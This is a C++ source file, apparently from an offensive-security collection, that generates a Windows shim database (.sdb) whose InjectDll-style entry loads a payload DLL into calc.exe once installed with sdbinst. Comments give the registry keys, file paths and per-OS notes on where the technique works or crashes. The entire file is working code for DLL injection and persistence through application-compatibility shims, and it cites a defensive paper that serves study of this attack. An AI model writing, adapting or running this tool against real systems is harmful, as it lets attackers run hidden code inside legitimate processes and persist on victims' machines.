// creates a shim database (.sdb) file
// the database can be installed using the "sdbinst <*.sdb>" command which requires elevated privileges
// based on: https://gist.github.com/w4kfu/95a87764db7029e03f09d78f7273c4f4, https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
// Windows 7 64 bit (copy payload_dll.dll to: C:\Windows\AppPatch\AppPatch64\dll_payload.dll)
// Windows 7 32bit works only using "Compatability Adminstrator 32 bit" and not on calc.exe (tested working with x32dbg.exe, pafish.exe)
//  - own implementation loads dll (sysinternals ProcMon) but crashes process
// Windows 10 WoW64 works when using the "Compatability Adminstrator 32 bit" to apply the "InjectDll" fix. That fix is not available in 64 bit.
//  - own implemenation does not load dll


// sdbinst creates registry keys:
//  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom
//  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB

// default file paths
//  C:\Windows\AppPatch\*.dll
//  C:\Windows\AppPatch\AppPatch64\*.dll
//  C:\Windows\AppPatch\Custom\*.sdb
//  C:\Windows\AppPatch\Custom\Custom64\*.sdb


#include <windows.h>
#include <stdio.h>

#define PAYLOAD_DLL         L"dll_payload.dll"
#define TARGET_EXECUTABLE   L"calc.exe"

#ifdef _WIN64
#define OS_PLATFORM         4 
#else
#define OS_PLATFORM         1   
#endif

#define TAGID_NULL          0

#define TAG_TYPE_LIST       0x7000
#define TAG_DATABASE        (0x1 | TAG_TYPE_LIST)
#define TAG_LIBRARY         (0x2 | TAG_TYPE_LIST)
#define TAG_INEXCLUDE       (0x3 | TAG_TYPE_LIST)
#define TAG_SHIM            (0x4 | TAG_TYPE_LIST)
#define TAG_EXE             (0x7 | TAG_TYPE_LIST)
#define TAG_MATCHING_FILE   (0x8 | TAG_TYPE_LIST)
#define TAG_SHIM_REF        (0x9 | TAG_TYPE_LIST)

#define TAG_TYPE_DWORD      0x4000
#define TAG_OS_PLATFORM     (0x23| TAG_TYPE_DWORD)

#define TAG_TYPE_STRINGREF  0x6000
#define TAG_NAME            (0x1 | TAG_TYPE_STRINGREF)
#define TAG_MODULE          (0x3 | TAG_TYPE_STRINGREF)
#define TAG_APP_NAME        (0x6 | TAG_TYPE_STRINGREF)
#define TAG_DLLFILE         (0xA | TAG_TYPE_STRINGREF)

#define TAG_TYPE_BINARY     0x9000
#define TAG_EXE_ID          (0x4 | TAG_TYPE_BINARY)
#define TAG_DATABASE_ID     (0x7 | TAG_TYPE_BINARY)

#define TAG_TYPE_NULL       0x1000
#define TAG_INCLUDE         (0x1 | TAG_TYPE_NULL)

typedef enum _PATH_TYPE {
    DOS_PATH,
    NT_PATH
} PATH_TYPE;

typedef HANDLE PDB;
typedef DWORD TAG;
typedef DWORD INDEXID;
typedef DWORD TAGID;

using fnSdbCreateDatabase = PDB(WINAPI*)(LPCWSTR, PATH_TYPE);
using fnSdbCloseDatabaseWrite = VOID(WINAPI*)(PDB);
using fnSdbBeginWriteListTag = TAGID(WINAPI*)(PDB, TAG);
using fnSdbEndWriteListTag = BOOL(WINAPI*)(PDB, TAGID);
using fnSdbWriteStringTag = BOOL(WINAPI*)(PDB, TAG, LPCWSTR);
using fnSdbWriteDWORDTag = BOOL(WINAPI*)(PDB, TAG, DWORD);
using fnSdbWriteBinaryTag = BOOL(WINAPI*)(PDB, TAG, PBYTE, DWORD);
using fnSdbWriteNULLTag = BOOL(WINAPI*)(PDB, TAG);

fnSdbBeginWriteListTag SdbBeginWriteListTag = nullptr;
fnSdbCloseDatabaseWrite SdbCloseDatabaseWrite = nullptr;
fnSdbCreateDatabase SdbCreateDatabase = nullptr;
fnSdbEndWriteListTag SdbEndWriteListTag = nullptr;
fnSdbWriteBinaryTag SdbWriteBinaryTag = nullptr;
fnSdbWriteDWORDTag SdbWriteDWORDTag = nullptr;
fnSdbWriteStringTag SdbWriteStringTag = nullptr;
fnSdbWriteNULLTag SdbWriteNULLTag = nullptr;

bool CreateApplicationCompatibilityDatabase()
{
    PDB shimdb = SdbCreateDatabase(L"shim_injection.sdb", DOS_PATH);
    if (!shimdb)
    {
        printf("[Error] %d - Failed to create compatability database\n", GetLastError());
        return false;
    }

    char binaryTag[] = "AAAAAAAAAAAAAAAA";
    char tagDatabaseid[] = "BBBBBBBBBBBBBBBB";

    TAGID tIdDatabase = SdbBeginWriteListTag(shimdb, TAG_DATABASE);
    SdbWriteDWORDTag(shimdb, TAG_OS_PLATFORM, OS_PLATFORM);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_database");
    SdbWriteBinaryTag(shimdb, TAG_DATABASE_ID, (BYTE*)tagDatabaseid, strlen(tagDatabaseid));

    TAGID tIdLibrary = SdbBeginWriteListTag(shimdb, TAG_LIBRARY);
    TAGID tIdShim = SdbBeginWriteListTag(shimdb, TAG_SHIM);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_shim");
    SdbWriteStringTag(shimdb, TAG_DLLFILE, PAYLOAD_DLL);

    TAGID tIdInexclude = SdbBeginWriteListTag(shimdb, TAG_INEXCLUDE);
    SdbWriteNULLTag(shimdb, TAG_INCLUDE);
    SdbWriteStringTag(shimdb, TAG_MODULE, L"*");
    SdbEndWriteListTag(shimdb, tIdInexclude);
    SdbEndWriteListTag(shimdb, tIdShim);
    SdbEndWriteListTag(shimdb, tIdLibrary);

    TAGID tIdExe = SdbBeginWriteListTag(shimdb, TAG_EXE);
    SdbWriteStringTag(shimdb, TAG_NAME, TARGET_EXECUTABLE);
    SdbWriteStringTag(shimdb, TAG_APP_NAME, L"shim_injection_apps");
    SdbWriteBinaryTag(shimdb, TAG_EXE_ID, (BYTE*)binaryTag, strlen(binaryTag));

    TAGID tIdMatchingFile = SdbBeginWriteListTag(shimdb, TAG_MATCHING_FILE);
    SdbWriteStringTag(shimdb, TAG_NAME, L"*");
    SdbEndWriteListTag(shimdb, tIdMatchingFile);

    TAGID tIdShimRef = SdbBeginWriteListTag(shimdb, TAG_SHIM_REF);
    SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_shim");
    SdbEndWriteListTag(shimdb, tIdShimRef);
    SdbEndWriteListTag(shimdb, tIdExe);
    SdbEndWriteListTag(shimdb, tIdDatabase);
    SdbCloseDatabaseWrite(shimdb);
    return TRUE;
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
#else
    printf("[Error] - The current implementation only supports 64 bit\n");
    return 1;
#endif
    HMODULE appHelpDllHandle = LoadLibraryA("apphelp.dll");
    if (!appHelpDllHandle) 
    {
        printf("[Error] %d - Failed to load apphelp.dll\n", GetLastError());
        return 1;
    }
    
    // resolve required Sdb API functions
    // https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database
    SdbBeginWriteListTag = (fnSdbBeginWriteListTag)GetProcAddress(appHelpDllHandle, "SdbBeginWriteListTag");
    SdbCloseDatabaseWrite = (fnSdbCloseDatabaseWrite)GetProcAddress(appHelpDllHandle, "SdbCloseDatabaseWrite");
    SdbCreateDatabase = (fnSdbCreateDatabase)GetProcAddress(appHelpDllHandle, "SdbCreateDatabase");
    SdbEndWriteListTag = (fnSdbEndWriteListTag)GetProcAddress(appHelpDllHandle, "SdbEndWriteListTag");
    SdbWriteBinaryTag = (fnSdbWriteBinaryTag)GetProcAddress(appHelpDllHandle, "SdbWriteBinaryTag");
    SdbWriteDWORDTag = (fnSdbWriteDWORDTag)GetProcAddress(appHelpDllHandle, "SdbWriteDWORDTag");
    SdbWriteStringTag = (fnSdbWriteStringTag)GetProcAddress(appHelpDllHandle, "SdbWriteStringTag");
    SdbWriteNULLTag = (fnSdbWriteNULLTag)GetProcAddress(appHelpDllHandle, "SdbWriteNULLTag");

    if (!SdbBeginWriteListTag || !SdbCloseDatabaseWrite || !SdbCreateDatabase || !SdbEndWriteListTag || !SdbWriteBinaryTag || !SdbWriteDWORDTag || !SdbWriteStringTag || !SdbWriteNULLTag)
    {
        printf("[Error] %d - Failed to resolve a Sdb function in apphelp.dll\n", GetLastError());
        return 1;
    }

    if (!CreateApplicationCompatibilityDatabase())
    {
        printf("[Error] - Failed to create compatibility patch database\n");
        return 1;
    }
    return 0;
}